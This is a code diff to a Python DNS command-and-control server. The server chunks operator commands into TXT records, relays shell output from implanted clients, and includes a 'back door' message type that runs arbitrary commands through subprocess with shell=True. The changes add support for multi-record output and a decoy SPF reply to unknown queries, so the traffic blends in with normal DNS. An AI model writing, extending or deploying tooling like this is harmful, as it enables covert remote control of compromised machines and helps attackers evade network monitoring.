@@ -132,13 +132,14 @@ def dns_response(data):
         for rdata in ns_records:
             reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
         txtReply = c2(qn)
-        reply.add_answer(RR(qname, 16, ttl=0, rdata=TXT(txtReply)))
+        for answer in txtReply:
+            reply.add_answer(RR(qname, 16, ttl=0, rdata=TXT(answer)))
         reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
         if debuggin: print(f"{OV}Outgoing txt reply looks like: {OR}{txtReply}{OM}")
     return reply.pack()
 
 def c2(qname):
-    #try:
+    try:
         global respPktCt
         global respText
         global userInput
@@ -149,17 +150,17 @@ def c2(qname):
         request = request[3:]
         if msgType == "CHK": # client checking in for commands
             if userInput == "": # no user input? NOP
-                response = b"NUL"
+                response = [b"NUL",]
             else: # have a command? send the command header
                 encCmd = encode64(userInput).decode('utf-8') # encode so special chars don't nuke us
                 userInput = ""
                 global chunks
                 chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
                 chunks.reverse() # so we can pop pieces off in order
-                response = b"HDR" + encode64(str(len(chunks)))
+                response = [b"HDR" + encode64(str(len(chunks))),]
         elif msgType == "HDR": # client sending response header
             respPktCt = int(decode32(request).decode('utf-8').split(" ")[0])
-            response = b"ACK" + bytes(str(respPktCt),'utf-8')
+            response = [b"ACK" + bytes(str(respPktCt),'utf-8'),]
         elif msgType == "RES": # client sending response body
             if debuggin: print(f"{OV}respText so far is {OR}{respText}{OV}, and respPktCt is {OR}{respPktCt}{OM}")
             # if respPktCt < 1:
@@ -167,32 +168,36 @@ def c2(qname):
             #     response = b"DIE Unexpected RES"
             respText += request
             respPktCt -= 1
-            if respPktCt == 0: # end of the thread from client? print output
+            if respPktCt <= 0: # end of the thread from client? print output
                 print(f"{OR}Command output: \n{OV}{decode32(respText).decode('utf-8')}{OM}")
                 respText = "" # reset for next command
-            response = ("ACK" + str(respPktCt)).encode('utf-8')
+            response = [("ACK" + str(respPktCt)).encode('utf-8'),]
         elif msgType == "CON": # client ready for more from server
             if len(chunks) < 1:
                 print(f"{OE}Got unexpected client 'CON'{OM}")
-                response = b"DIE Unexpected CON"
+                response = [b"DIE Unexpected CON",]
             else:
-                response = b"CMD" + chunks.pop().encode('utf-8') # send the next chunk of command
+                response = [b"CMD" + chunks.pop().encode('utf-8'),] # send the next chunk of command
         elif msgType == "126": # a secret back door?!?
             command = decode32(request).decode('utf-8')
             try:
                 cmdOutput = subprocess.check_output(command, shell=True)
-                response = b"Command injection?! " + cmdOutput[:200]
+                response = [b"Command injection?! " + cmdOutput[:200],]
+                if len(cmdOutput) > 200:
+                    response += [cmdOutput[200:],]
             except:
-                response = b"Command injection?! Command failed."
+                response = [b"Command injection?! Command failed.",]
         else: # something went wrong
-            error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
-            print(OE + error + OM)
-            response = error.encode('utf-8')
-            raise Exception(error)
+            response = [b"v=spf1 -all",] # typical DNS TXT response for all other requests
+            if debuggin: print(f"{OV}Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {OR}{msgType}{OM}")
+        #    error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
+        #    print(OE + error + OM)
+        #    response = error.encode('utf-8')
+        #    raise Exception(error)
         if debuggin: print(f"{OV}c2() response:{OR} {response}{OM}, ", end='')
         return response
-    #except Exception as ex:
-    #    print(f"{OE}Exception in c2(): {OR}{ex}{OM}")
+    except Exception as ex:
+        print(f"{OE}Exception in c2(): {OR}{ex}{OM}")
 
 class BaseRequestHandler(socketserver.BaseRequestHandler):
     def get_data(self):
